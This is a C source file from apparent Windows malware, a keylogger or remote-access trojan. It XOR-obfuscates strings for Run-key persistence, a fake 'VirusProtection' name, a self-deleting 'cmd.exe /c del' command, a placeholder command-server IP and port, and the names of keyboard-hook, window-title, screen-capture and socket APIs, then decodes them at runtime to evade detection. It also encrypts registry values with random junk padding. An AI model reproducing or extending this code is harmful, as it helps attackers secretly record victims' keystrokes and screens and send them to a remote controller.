#include <stdlib.h>
#include <string.h>
#include "memProtect.h"
#include "types.h"

//use the program in the folder "memProtect" to make this
//uint8* cast cuz compiler is a bitch
const uint8 *memProtect_mem[][2] = { 	{ (uint8*)"\x07\x58\xBA\xAE", (uint8*)"\x0D\x1C\x1C\x08\x0D\x18\x0D" }, //APPDATA
								{ (uint8*)"\x0B\x4E\xCB\x9E", (uint8*)"\x4E\x48\x5E\x49\x4B\x49\x54\x5D\x52\x57\x5E" }, //USERPROFILE
								{ (uint8*)"\x0F\xF8\x49\x0C", (uint8*)"\xDE\xD0\xD9\x93\xD8\xC5\xD8\x9D\x92\xDE\x9D\xD9\xD8\xD1\x9D" }, //cmd.exe /c del
								{ (uint8*)"\x0B\x73\x4D\xE1", (uint8*)"\xBC\xB2\xBB\xF1\xBA\xA7\xBA\xFF\xF0\xBC\xFF" }, //cmd.exe /c
								{ (uint8*)"\x07\x7B\x5C\x57", (uint8*)"\x31\x00\x00\x34\x11\x04\x11" }, //AppData
								{ (uint8*)"\x2D\xFC\x0F\x7B", (uint8*)"\xDB\xE7\xEE\xFC\xFF\xE9\xFA\xED\xD4\xC5\xE1\xEB\xFA\xE7\xFB\xE7\xEE\xFC\xD4\xDF\xE1\xE6\xEC\xE7\xFF\xFB\xD4\xCB\xFD\xFA\xFA\xED\xE6\xFC\xDE\xED\xFA\xFB\xE1\xE7\xE6\xD4\xDA\xFD\xE6" }, //Software\Microsoft\Windows\CurrentVersion\Run
								{ (uint8*)"\x12\x54\x19\x94", (uint8*)"\x8A\xB6\xBF\xAD\xAE\xB8\xAB\xBC\x85\x94\xB0\xBA\xAB\xB6\xAA\xB6\xBF\xAD" }, //Software\Microsoft
								{ (uint8*)"\x0F\x1C\x30\xD6", (uint8*)"\xAC\x93\x88\x8F\x89\xAA\x88\x95\x8E\x9F\x99\x8E\x93\x95\x94" }, //VirusProtection
								{ (uint8*)"\x25\x9F\xB3\xCC", (uint8*)"\xBC\xAC\x8F\x83\x81\x8C\xBC\xAD\x89\x83\x92\x8F\x93\x8F\x86\x94\xBC\xB6\x89\x92\x95\x93\xB0\x92\x8F\x94\x85\x83\x94\x89\x8F\x8E\xCE\x84\x81\x94\x81" }, //\Local\Microsoft\VirusProtection.data
								{ (uint8*)"\x11\x85\x1A\x70", (uint8*)"YOUR MASTER IP!" }, //You't master IP/DNS
								{ (uint8*)"\x02\x68\x6E\x9C", (uint8*)"\xF0\x90" } }; //YOUR MASTER PORT

const uint8 *memProtect_libmem[][2] = { { (uint8*)"\x0C\xD1\x05\xD5", (uint8*)"\x40\x65\x77\x60\x71\x68\x32\x33\x2F\x65\x6D\x6D" }, //Advapi32.dll
								{ (uint8*)"\x0C\x6F\x95\xE2", (uint8*)"\x4A\x7D\x7F\x5F\x7D\x6C\x4E\x79\x74\x6D\x7D\x59" }, //RegGetValueA
								{ (uint8*)"\x0F\xE0\x1A\xB7", (uint8*)"\x1F\x28\x2A\x1E\x28\x39\x06\x28\x34\x1B\x2C\x21\x38\x28\x0C" }, //RegSetKeyValueA

								{ (uint8*)"\x0A\xA6\x0B\x3B", (uint8*)"\xC1\xE5\xA4\xC9\xA5\xA4\xB8\xF2\xFA\xFA" }, //Ws2_32.dll
								{ (uint8*)"\x0A\xA2\xD5\x1F", (uint8*)"\x3F\x3B\x29\x3B\x1C\x09\x1A\x1C\x1D\x18" }, //WSAStartup
								{ (uint8*)"\x0A\x9E\x6B\xC3", (uint8*)"\x61\x65\x77\x75\x5A\x53\x57\x58\x43\x46" }, //WSACleanup
								{ (uint8*)"\x04\x76\x8A\xE7", (uint8*)"\x69\x7E\x78\x6D" }, //recv
								{ (uint8*)"\x04\xD2\x65\xFE", (uint8*)"\x3A\x2C\x27\x2D" }, //send
								{ (uint8*)"\x0D\x84\x34\x12", (uint8*)"\xC5\xC7\xD6\xCA\xCD\xD1\xD6\xC0\xDB\xCC\xC3\xCF\xC7" }, //gethostbyname
								{ (uint8*)"\x0B\xC7\xB8\x34", (uint8*)"\x28\x27\x24\x38\x2E\x38\x24\x28\x20\x2E\x3F" }, //closesocket
								{ (uint8*)"\x08\x1C\x47\x7E", (uint8*)"\x56\x4D\x50\x51\x41\x4A\x52\x4B" }, //shutdown
								{ (uint8*)"\x0A\x20\x0B\xEF", (uint8*)"\xB7\xA1\xB0\xB7\xAB\xA7\xAF\xAB\xB4\xB0" }, //setsockopt
								{ (uint8*)"\x0B\xBA\x06\x06", (uint8*)"\xD3\xD5\xD9\xCE\xD6\xC9\xD5\xD9\xD1\xDF\xCE" }, //ioctlsocket
								{ (uint8*)"\x06\x23\xFA\x5B", (uint8*)"\xF1\xED\xE1\xE9\xE7\xF6" }, //socket
								{ (uint8*)"\x06\xFE\x50\x12", (uint8*)"\xCF\xD9\xD0\xD9\xDF\xC8" }, //select
								{ (uint8*)"\x05\x37\x5C\x6C", (uint8*)"\x6F\x73\x68\x69\x74" }, //htons
								{ (uint8*)"\x07\xC3\xA4\xE4", (uint8*)"\xE0\xEC\xED\xED\xE6\xE0\xF7" }, //connect
								{ (uint8*)"\x0C\xB0\x82\x61", (uint8*)"\x0C\x0C\x04\x00\x12\x15\x17\x1A\x20\x00\x36\x27" }, //__WSAFDIsSet #FOR FD_ISSET()

								{ (uint8*)"\x09\xB0\x82\x61", (uint8*)"\x14\x37\x3A\x60\x61\x7D\x37\x3F\x3F" }, //Gdi32.dll
								{ (uint8*)"\x0C\x43\x4C\xA9", (uint8*)"\xF5\xC3\xCA\xC3\xC5\xD2\xE9\xC4\xCC\xC3\xC5\xD2" }, //SelectObject
								{ (uint8*)"\x12\x2C\x50\x73", (uint8*)"\x4C\x7D\x6A\x6E\x7B\x6A\x4C\x60\x62\x7F\x6E\x7B\x66\x6D\x63\x6A\x4B\x4C" }, //CreateCompatibleDC
								{ (uint8*)"\x16\xC6\xC6\x51", (uint8*)"\x12\x23\x34\x30\x25\x34\x12\x3E\x3C\x21\x30\x25\x38\x33\x3D\x34\x13\x38\x25\x3C\x30\x21" }, //CreateCompatibleBitmap
								{ (uint8*)"\x11\x7C\xFA\xBD", (uint8*)"\x68\x5E\x4F\x68\x4F\x49\x5E\x4F\x58\x53\x79\x57\x4F\x76\x54\x5F\x5E" }, //SetStretchBltMode
								{ (uint8*)"\x0A\xED\x75\xB2", (uint8*)"\x79\x5E\x58\x4F\x5E\x49\x42\x68\x46\x5E" }, //StretchBlt
								{ (uint8*)"\x09\x5E\x62\xA0", (uint8*)"\xDB\xF9\xE8\xD8\xD5\xDE\xF5\xE8\xEF" }, //GetDIBits
								{ (uint8*)"\x0C\x45\xE6\xF3", (uint8*)"\x14\x35\x3C\x35\x24\x35\x1F\x32\x3A\x35\x33\x24" }, //DeleteObject
								{ (uint8*)"\x08\x89\x57\xB6", (uint8*)"\x2C\x0D\x04\x0D\x1C\x0D\x2C\x2B" },  //DeleteDC

								{ (uint8*)"\x09\x80\xB5\x35", (uint8*)"\x50\x73\x61\x70\x69\x2E\x64\x6C\x6C" }, //Psapi.dll
								{ (uint8*)"\x14\xE9\xA9\x75", (uint8*)"\x72\x50\x41\x78\x5A\x51\x40\x59\x50\x73\x5C\x59\x50\x7B\x54\x58\x50\x70\x4D\x74" }, //GetModuleFileNameExA

								{ (uint8*)"\x0A\x53\x4A\x38", (uint8*)"\x74\x52\x44\x53\x12\x13\x0F\x45\x4D\x4D" }, //User32.dll
								{ (uint8*)"\x11\x21\x12\xF7", (uint8*)"\x97\xA1\xB0\x93\xAD\xAA\xA0\xAB\xB3\xB7\x8C\xAB\xAB\xAF\x81\xBC\x85" }, //SetWindowsHookExA
								{ (uint8*)"\x0B\xD2\x91\xD0", (uint8*)"\xD4\xF6\xE7\xDE\xF6\xE0\xE0\xF2\xF4\xF6\xD2" }, //GetMessageA
								{ (uint8*)"\x10\x47\x03\x5F", (uint8*)"\x4F\x69\x7A\x75\x68\x77\x7A\x6F\x7E\x56\x7E\x68\x68\x7A\x7C\x7E" }, //TranslateMessage
								{ (uint8*)"\x10\x8C\xF3\x8D", (uint8*)"\xB6\x9B\x81\x82\x93\x86\x91\x9A\xBF\x97\x81\x81\x93\x95\x97\xB3" }, //DispatchMessageA
								{ (uint8*)"\x0B\xED\x83\x38", (uint8*)"\x11\x33\x22\x1D\x33\x2F\x05\x22\x37\x22\x33" }, //GetKeyState
								{ (uint8*)"\x0E\x30\xA1\xE8", (uint8*)"\x3A\x18\x15\x15\x37\x1C\x01\x0D\x31\x16\x16\x12\x3C\x01" }, //CallNextHookEx
								{ (uint8*)"\x13\x79\x3C\x06", (uint8*)"\x04\x26\x37\x05\x2C\x31\x26\x24\x31\x2C\x36\x2D\x27\x14\x2A\x2D\x27\x2C\x34" }, //GetForegroundWindow
								{ (uint8*)"\x0E\xE9\xAA\xC4", (uint8*)"\xC0\xE2\xF3\xD0\xEE\xE9\xE3\xE8\xF0\xD3\xE2\xFF\xF3\xC6" } }; //GetWindowTextA

extern inline uint8 memProtect_dec(uint8 val, uint8 key, uint8 salt, uint8 pepper)
{
	return (((val ^ pepper) ^ salt) ^ key);
}

uint8* memProtect_Request(int idx)
{
	if(idx < 0 || idx > MEMPROTECT_COUNT)
	{
		return NULL;
	}

	uint8* rdata = malloc(memProtect_mem[idx][0][0] + sizeof(char));
	memset(rdata, 0, memProtect_mem[idx][0][0] + sizeof(char));

	int i;

	for(i = 0; i != memProtect_mem[idx][0][0]; i++)
	{
		rdata[i] = memProtect_dec(memProtect_mem[idx][1][i], memProtect_mem[idx][0][1], memProtect_mem[idx][0][2], memProtect_mem[idx][0][3]);
	}

	return rdata;
}

uint8* memProtect_GetLibData(int idx)
{
	if(idx < 0 || idx > MEMPROTECT_LIB_COUNT)
	{
		return NULL;
	}

	uint8* rdata = malloc(memProtect_libmem[idx][0][0] + sizeof(char));
	memset(rdata, 0, memProtect_libmem[idx][0][0] + sizeof(char));

	int i;

	for(i = 0; i != memProtect_libmem[idx][0][0]; i++)
	{
		rdata[i] = memProtect_dec(memProtect_libmem[idx][1][i], memProtect_libmem[idx][0][1], memProtect_libmem[idx][0][2], memProtect_libmem[idx][0][3]);
	}

	return rdata;
}

extern inline uint8 memProtect_regEnc(uint8 val)
{
	return (val ^ MEMPROTECT_XOR_REG_KEY) ^ MEMPROTECT_XOR_REG_SALT;
}

extern inline uint8 memProtect_regDec(uint8 val)
{
	return (val ^ MEMPROTECT_XOR_REG_SALT) ^ MEMPROTECT_XOR_REG_KEY;
}

void memProtect_EncryptRegValue(uint8* data, OUT_USTRP odata, OUT_INT iolen)
{
	int len = *iolen;
	int extraLen = 1 + (rand() % 0xF); //len of junk data

	uint8* datap = data;
	uint8* rval = malloc(len + 1 + extraLen);
	memset(rval, 0, len + 1 + extraLen);

	rval[0] =  memProtect_regEnc(len);
	extraLen += len;

	int i;

	for(i = 0; i != len; i++)
	{
		rval[i + 1] = memProtect_regEnc(datap[i]);
	}

	for(i = i; i != extraLen; i++) //junk data
	{
		rval[i + 1] = rand() % 0xFF;
	}

	*odata = rval;
	*iolen = extraLen;
}

void memProtect_DecryptRegValue(uint8* data, OUT_USTRP odata, OUT_INT olen)
{
	uint8* datap = data;
	int len = memProtect_regDec(datap[0]);

	int i;
	uint8* rval = malloc(len + sizeof(char));
	memset(rval, 0, len + sizeof(char));

	for(i = 1; i != len + 1; i++)
	{
		rval[i - 1] = memProtect_regDec(datap[i]);
	}

	*odata = rval;
	*olen = len;
}